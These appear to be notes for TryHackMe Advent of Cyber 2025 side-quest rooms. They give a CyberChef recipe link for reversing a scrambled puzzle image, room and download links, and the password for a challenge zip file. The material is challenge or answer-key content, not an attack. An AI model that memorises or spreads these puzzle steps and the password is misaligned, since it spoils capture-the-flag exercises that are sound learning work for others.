Room Link - https://tryhackme.com/room/sq3-aoc2025-bk3vvbcgiT

```
https://gchq.github.io/CyberChef/#recipe=To_Base64('A-Za-z0-9%2B/%3D')Label('encoder1')ROT13(true,true,false,7)Split('H0','H0%5C%5Cn')Jump('encoder1',8)Fork('%5C%5Cn','%5C%5Cn',false)Zlib_Deflate('Dynamic%20Huffman%20Coding')XOR(%7B'option':'UTF8','string':'h0pp3r'%7D,'Standard',false)To_Base32('A-Z2-7%3D')Merge(true)Generate_Image('Greyscale',1,512)&input=SG9wcGVyIG1hbmFnZWQgdG8gdXNlIEN5YmVyQ2hlZiB0byBzY3JhbWJsZSB0aGUgZWFzdGVyIGVnZyBrZXkgaW1hZ2UuIEhlIHVzZWQgdGhpcyB2ZXJ5IHJlY2lwZSB0byBkbyBpdC4gVGhlIHNjcmFtYmxlZCB2ZXJzaW9uIG9mIHRoZSBlZ2cgY2FuIGJlIGRvd25sb2FkZWQgZnJvbTogCgpodHRwczovL3RyeWhhY2ttZS1pbWFnZXMuczMuYW1hem9uYXdzLmNvbS91c2VyLXVwbG9hZHMvNWVkNTk2MWM2Mjc2ZGY1Njg4OTFjM2VhL3Jvb20tY29udGVudC81ZWQ1OTYxYzYyNzZkZjU2ODg5MWMzZWEtMTc2NTk1NTA3NTkyMC5wbmcKClJldmVyc2UgdGhlIGFsZ29yaXRobSB0byBnZXQgaXQgYmFjayE&oeol=VT
```

Image Link - "https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/5ed5961c6276df568891c3ea-1765955075920.png"


# SQ04 - BreachBlocker Unlocker

Room Link - https://tryhackme.com/room/sq4-aoc2025-32LoZ4zePK

Download files - https://assets.tryhackme.com/additional/aoc2025/SQ4/NorthPole.zip

The password for the file is `CanYouREM3?`.

